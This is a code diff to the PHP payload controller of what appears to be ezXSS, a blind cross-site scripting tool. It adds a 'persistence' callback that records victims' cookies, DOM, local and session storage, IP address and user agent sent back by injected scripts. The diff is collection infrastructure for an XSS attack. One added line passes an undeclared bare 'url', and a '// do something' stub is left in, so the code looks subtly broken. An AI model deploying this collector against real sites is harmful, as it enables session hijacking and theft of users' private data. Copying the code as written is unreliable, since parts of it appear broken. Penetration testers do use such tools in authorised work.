@@ -71,6 +71,7 @@ class Payloads extends Controller
         try {
             $this->view->renderPayload($name);
             $this->view->setContentType('application/x-javascript');
+            $this->view->renderData('payload', url);
             return $this->view->getContent();
         } catch (Exception $e) {
             // On any type of error, fallback to default
@@ -150,8 +151,13 @@ class Payloads extends Controller
                 }
             }
             if (!$foundWhitelist) {
-                return '1github.com/ssl/ezXSS';
+                return 'github.com/ssl/ezXSS';
             }
+        }
+
+        // Check if callback should be threated as persistence mode
+        if(isset($data->method) && $data->method === 'persist') {
+            return $this->persistCallback($data);
         }
 
         // Check if the report should be saved or alerted
@@ -213,6 +219,34 @@ class Payloads extends Controller
         }
 
         return 'github.com/ssl/ezXSS';
+    }
+
+    /**
+     * Persistence allback function that receives all incoming data from persistence mode
+     *
+     * @param object $data The data coming from the callback function
+     * @return void
+     */
+    private function persistCallback($data)
+    {
+        // do something
+
+        $data->id = $this->model('Persistence')->add(
+            $data->clientid ?? '',
+            $data->cookies ?? '',
+            $data->dom ?? '',
+            $data->origin,
+            $data->referer,
+            $data->uri,
+            $data->{'user-agent'},
+            $data->ip,
+            ($data->screenshotName ?? ''),
+            json_encode($data->localstorage ?? ''),
+            json_encode($data->sessionstorage ?? ''),
+            $data->payload
+        );
+
+        return 'github.com/ssl/ezXSS persistence';
     }
 
     /**
